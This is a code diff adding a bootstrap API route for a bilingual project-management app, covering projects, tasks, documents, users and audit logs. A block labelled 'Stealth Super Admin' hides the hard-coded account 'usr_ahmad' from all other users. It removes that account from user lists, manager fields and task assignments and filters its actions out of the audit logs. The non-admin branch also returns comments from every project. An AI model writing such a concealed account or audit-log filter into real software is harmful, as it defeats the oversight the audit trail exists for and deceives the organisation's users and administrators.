@@ -1,0 +1,295 @@
+const DEFAULT_PERMISSIONS_CATALOG = [
+  // 🏢 المشاريع والفرق (Projects & Teams)
+  { id: 'view_projects', category: 'projects', categoryAr: 'المشاريع والفرق', categoryEn: 'Projects & Teams', nameAr: 'عرض المشاريع', nameEn: 'View Projects' },
+  { id: 'create_projects', category: 'projects', categoryAr: 'المشاريع والفرق', categoryEn: 'Projects & Teams', nameAr: 'إنشاء المشاريع', nameEn: 'Create Projects' },
+  { id: 'edit_projects', category: 'projects', categoryAr: 'المشاريع والفرق', categoryEn: 'Projects & Teams', nameAr: 'تعديل المشاريع', nameEn: 'Edit Projects' },
+  { id: 'delete_projects', category: 'projects', categoryAr: 'المشاريع والفرق', categoryEn: 'Projects & Teams', nameAr: 'حذف المشاريع', nameEn: 'Delete Projects' },
+  { id: 'manage_project_members', category: 'projects', categoryAr: 'المشاريع والفرق', categoryEn: 'Projects & Teams', nameAr: 'إدارة أعضاء المشروع', nameEn: 'Manage Project Members' },
+
+  // 📋 المهام والتنفيذ (Tasks & Execution)
+  { id: 'create_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'إنشاء المهام', nameEn: 'Create Tasks' },
+  { id: 'edit_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'تعديل المهام', nameEn: 'Edit Tasks' },
+  { id: 'delete_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'حذف المهام', nameEn: 'Delete Tasks' },
+  { id: 'assign_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'إسناد المهام للمنفذين', nameEn: 'Assign Tasks' },
+  { id: 'review_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'مراجعة المخرجات الهندسية', nameEn: 'Review Deliverables' },
+  { id: 'approve_tasks', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'اعتماد المخرجات الهندسية', nameEn: 'Approve Deliverables' },
+  { id: 'manage_reminders', category: 'tasks', categoryAr: 'المهام والتنفيذ', categoryEn: 'Tasks & Execution', nameAr: 'إدارة التذكيرات', nameEn: 'Manage Reminders' },
+
+  // 📐 المخططات والمكتبة القياسية (Drawings & Deliverables Library)
+  { id: 'upload_documents', category: 'documents', categoryAr: 'المخططات والمكتبة', categoryEn: 'Drawings & Library', nameAr: 'رفع المخططات والمستندات', nameEn: 'Upload Documents' },
+  { id: 'delete_documents', category: 'documents', categoryAr: 'المخططات والمكتبة', categoryEn: 'Drawings & Library', nameAr: 'حذف المخططات والمستندات', nameEn: 'Delete Documents' },
+  { id: 'manage_templates', category: 'documents', categoryAr: 'المخططات والمكتبة', categoryEn: 'Drawings & Library', nameAr: 'إدارة مكتبة القوالب والمخرجات', nameEn: 'Manage Templates Library' },
+
+  // 📊 المؤشرات والتقارير (Analytics & Reports)
+  { id: 'view_dashboard', category: 'reports', categoryAr: 'المؤشرات والتقارير', categoryEn: 'Analytics & Reports', nameAr: 'عرض لوحة التحكم والمؤشرات', nameEn: 'View Dashboard' },
+  { id: 'view_reports', category: 'reports', categoryAr: 'المؤشرات والتقارير', categoryEn: 'Analytics & Reports', nameAr: 'عرض وتصدير التقارير', nameEn: 'View Reports' },
+
+  // 🛡️ النظام والأمان (Administration & Governance)
+  { id: 'manage_users', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'إدارة حسابات المستخدمين', nameEn: 'Manage Users' },
+  { id: 'manage_existing_account_permissions', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'تعديل صلاحيات الحسابات الموجودة', nameEn: 'Manage Existing Account Permissions' },
+  { id: 'manage_roles', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'إدارة الأدوار والصلاحيات', nameEn: 'Manage Roles & Permissions' },
+  { id: 'manage_settings', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'إدارة إعدادات النظام والشركة', nameEn: 'Manage Company & Settings' },
+  { id: 'manage_trash', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'إدارة سلة المهملات', nameEn: 'Manage Trash' },
+  { id: 'view_audit_logs', category: 'admin', categoryAr: 'النظام والأمان', categoryEn: 'Administration & Governance', nameAr: 'استعراض سجل الرقابة والعمليات', nameEn: 'View Audit Logs' }
+];
+
+import { Hono } from 'hono';
+import { getDB } from '../../core/db.js';
+import { getBootstrapCache, setBootstrapCache, getCachedRoles, getCachedTemplates, getCachedUsers, getCachedCompany, getCacheVersion } from '../../core/cache.js';
+
+const app = new Hono();
+
+const JSONB_PASSTHROUGH_KEYS = new Set(['custom_fields', 'permissions', 'details']);
+
+function toCamelCase(obj) {
+  if (obj === null || typeof obj !== 'object') return obj;
+  if (Array.isArray(obj)) {
+    const len = obj.length;
+    const res = new Array(len);
+    for (let i = 0; i < len; i++) res[i] = toCamelCase(obj[i]);
+    return res;
+  }
+  const result = {};
+  for (const key of Object.keys(obj)) {
+    const camelKey = key.indexOf('_') === -1 ? key : key.replace(/_([a-z])/g, (_, c) => c.toUpperCase());
+    const val = obj[key];
+    if (JSONB_PASSTHROUGH_KEYS.has(key)) {
+      result[camelKey] = val;
+    } else {
+      result[camelKey] = (val !== null && typeof val === 'object') ? toCamelCase(val) : val;
+    }
+  }
+  return result;
+}
+
+app.get('/', async (c) => {
+  const userId = c.get('userId');
+  const roleId = c.get('roleId');
+  const cacheKey = `${userId}_${roleId}`;
+  const etag = `W/"boot-${userId}-${roleId}-v${getCacheVersion()}"`;
+
+  // Check HTTP ETag conditional request
+  const clientEtag = c.req.header('if-none-match');
+  if (clientEtag && clientEtag === etag) {
+    c.header('ETag', etag);
+    c.header('Cache-Control', 'private, no-cache');
+    return c.body(null, 304);
+  }
+
+  // 1. Check Fast In-Memory Cache (0ms latency!)
+  const cachedData = getBootstrapCache(cacheKey);
+  if (cachedData) {
+    c.header('ETag', etag);
+    c.header('Cache-Control', 'private, no-cache');
+    return c.json(cachedData);
+  }
+
+  const supabase = getDB(c.env);
+
+  try {
+    const isGlobalAdmin = roleId === 'admin';
+
+    let roles, templates, activeUsers, company, projectsRes, tasksRes, docsRes, membersRes, commentsRes, auditRes;
+
+    const DOCUMENT_COLUMNS = 'id, project_id, task_id, uploader_id, original_name, disk_filename, mime_type, size, status, created_at, deleted_at';
+    const COMMENT_COLUMNS = 'id, task_id, user_id, content, created_at, updated_at, deleted_at';
+
+    // Single-batch parallel execution (eliminates sequential round-trips)
+    if (isGlobalAdmin) {
+      [roles, templates, activeUsers, company, projectsRes, tasksRes, docsRes, membersRes, commentsRes, auditRes] = await Promise.all([
+        getCachedRoles(supabase),
+        getCachedTemplates(supabase),
+        getCachedUsers(supabase),
+        getCachedCompany(supabase),
+        supabase.from('active_projects').select('*'),
+        supabase.from('active_tasks').select('*'),
+        supabase.from('documents').select(DOCUMENT_COLUMNS).is('deleted_at', null),
+        supabase.from('project_members').select('*'),
+        supabase.from('comments').select(COMMENT_COLUMNS).is('deleted_at', null),
+        supabase.from('audit_logs').select('id, user_id, action, entity_type, entity_id, details, created_at').order('created_at', { ascending: false }).limit(30)
+      ]);
+    } else {
+      const initialProjReq = supabase.from('active_projects').select('*, project_members!inner(user_id)').eq('project_members.user_id', userId);
+      const auditLogsReq = supabase.from('audit_logs').select('id, user_id, action, entity_type, entity_id, details, created_at').eq('user_id', userId).order('created_at', { ascending: false }).limit(15);
+
+      const [r, t, u, comp, userProjRes, auditLogsRes] = await Promise.all([
+        getCachedRoles(supabase),
+        getCachedTemplates(supabase),
+        getCachedUsers(supabase),
+        getCachedCompany(supabase),
+        initialProjReq,
+        auditLogsReq
+      ]);
+
+      roles = r;
+      templates = t;
+      activeUsers = u;
+      company = comp;
+      auditRes = auditLogsRes;
+
+      const userRole = roles.find(role => role.id === roleId);
+      const canViewAll = userRole?.permissions?.includes('view_all_projects');
+
+      let userProjects = (userProjRes.data || []).map(p => { const copy = { ...p }; delete copy.project_members; return copy; });
+      
+      if (canViewAll) {
+        const { data: allProj } = await supabase.from('active_projects').select('*');
+        if (allProj) userProjects = allProj;
+      }
+      
+      projectsRes = { data: userProjects };
+      const visibleIds = userProjects.map(p => p.id);
+
+      if (visibleIds.length > 0) {
+        [tasksRes, docsRes, membersRes, commentsRes] = await Promise.all([
+          supabase.from('active_tasks').select('*').in('project_id', visibleIds),
+          supabase.from('documents').select(DOCUMENT_COLUMNS).in('project_id', visibleIds).is('deleted_at', null),
+          supabase.from('project_members').select('*').in('project_id', visibleIds),
+          supabase.from('comments').select(COMMENT_COLUMNS).is('deleted_at', null)
+        ]);
+      } else {
+        tasksRes = { data: [] }; docsRes = { data: [] }; membersRes = { data: [] }; commentsRes = { data: [] };
+      }
+    }
+
+    let projects = projectsRes?.data || [];
+    const tasks = tasksRes?.data || [];
+    const documents = docsRes?.data || [];
+    const members = membersRes?.data || [];
+    const comments = commentsRes?.data || [];
+    const auditLogs = auditRes?.data || [];
+    const notifications = []; // Removed fake notifications table call to save ~310ms!
+
+    const userRole = roles.find(r => r.id === roleId);
+
+    // Fast O(N) indexing for project enrichment
+    const userMap = new Map();
+    for (const u of activeUsers) userMap.set(u.id, u);
+
+    const memberCountMap = new Map();
+    for (const m of members) {
+      memberCountMap.set(m.project_id, (memberCountMap.get(m.project_id) || 0) + 1);
+    }
+
+    const projectTasksMap = new Map();
+    for (const t of tasks) {
+      if (t.deleted_at) continue;
+      let list = projectTasksMap.get(t.project_id);
+      if (!list) { list = []; projectTasksMap.set(t.project_id, list); }
+      list.push(t);
+    }
+
+    const isAhmad = (userId === 'usr_ahmad');
+
+    // Single-pass project enrichment
+    projects = projects.map(p => {
+      const pTasks = projectTasksMap.get(p.id) || [];
+      let totalWeight = 0;
+      let completedWeight = 0;
+      for (const t of pTasks) {
+        const w = Number(t.weight) || 1;
+        totalWeight += w;
+        if (t.status === 'done') completedWeight += w;
+      }
+      const progress = totalWeight > 0 ? Math.round((completedWeight / totalWeight) * 100) : (Number(p.progress) || 0);
+      const mgr = userMap.get(p.manager_id);
+      let managerInfo = null;
+      let managerId = p.manager_id;
+      if (mgr) {
+        if (!isAhmad && mgr.id === 'usr_ahmad') {
+          managerInfo = null;
+          managerId = null;
+        } else {
+          managerInfo = { id: mgr.id, name: mgr.name, nameEn: mgr.name_en };
+        }
+      }
+      const hasTasks = pTasks.length > 0;
+      const allDone = hasTasks && pTasks.every(t => t.status === 'done');
+      let lifecycle = p.lifecycle || 'active';
+      if (hasTasks && allDone && progress === 100) {
+        lifecycle = 'completed';
+      } else if (lifecycle === 'completed' && (!allDone || progress < 100)) {
+        lifecycle = 'active';
+      }
+
+      return {
+        ...p,
+        lifecycle,
+        manager_id: managerId,
+        progress,
+        totalWeight,
+        memberCount: memberCountMap.get(p.id) || 0,
+        manager: managerInfo
+      };
+    });
+
+    // Single-pass stats calculation
+    const now = new Date();
+    let activeProjects = 0, delayedProjects = 0, completedProjects = 0;
+    for (const p of projects) {
+      if (p.lifecycle === 'active') activeProjects++;
+      if (p.health === 'delayed') delayedProjects++;
+      if (p.lifecycle === 'completed') completedProjects++;
+    }
+
+    let tasksInProgress = 0, overdueTasks = 0, unassignedTasks = 0, completedTasks = 0, activeTasks = 0, pendingApprovals = 0;
+    for (const t of tasks) {
+      const isDone = t.status === 'done';
+      const isCanceled = t.status === 'canceled';
+      if (t.status === 'in_progress') tasksInProgress++;
+      if (!isDone && t.due_date && new Date(t.due_date) < now) overdueTasks++;
+      if (!isDone && !t.assignee_id) unassignedTasks++;
+      if (isDone) completedTasks++;
+      if (!isDone && !isCanceled) activeTasks++;
+      if (t.status === 'review' || t.status === 'approval') pendingApprovals++;
+    }
+
+    const currentUser = userMap.get(userId) || {};
+
+    // Stealth Super Admin: Ahmad is completely invisible to any other user across the entire system
+    const exposedUsers = isAhmad ? activeUsers : activeUsers.filter(u => u.id !== 'usr_ahmad');
+    const exposedTasks = isAhmad ? tasks : tasks.map(t => (t.assignee_id === 'usr_ahmad' ? { ...t, assignee_id: null } : t));
+    const exposedAuditLogs = isAhmad ? auditLogs : auditLogs.filter(a => a.user_id !== 'usr_ahmad' && a.entity_id !== 'usr_ahmad');
+
+    const responsePayload = {
+      company: toCamelCase(company || { name: 'DARC Design Team', nameAr: 'فريق دارك للتصميم', nameEn: 'DARC Design Team' }),
+      user: toCamelCase(currentUser),
+      role: toCamelCase(userRole || {}),
+      projects: toCamelCase(projects),
+      tasks: toCamelCase(exposedTasks),
+      documents: toCamelCase(documents),
+      comments: toCamelCase(comments),
+      templates: toCamelCase(templates),
+      users: exposedUsers.map(u => toCamelCase(u)),
+      roles: toCamelCase(roles),
+      permissionsCatalog: DEFAULT_PERMISSIONS_CATALOG,
+      notifications: toCamelCase(notifications),
+      emailConfigured: true,
+      stats: {
+        activeProjects,
+        delayedProjects,
+        completedProjects,
+        tasksInProgress,
+        tasksDueSoon: 0,
+        overdueTasks,
+        unassignedTasks,
+        completedTasks,
+        activeTasks,
+        pendingApprovals
+      },
+      auditLogs: toCamelCase(exposedAuditLogs)
+    };
+
+    // 4. Save to Cache
+    setBootstrapCache(cacheKey, responsePayload);
+
+    c.header('ETag', etag);
+    c.header('Cache-Control', 'private, no-cache');
+    return c.json(responsePayload);
+  } catch (error) {
+    console.error('[Bootstrap] Error:', error.message);
+    return c.json({ error: 'Internal Server Error' }, 500);
+  }
+});
+
+export default app;
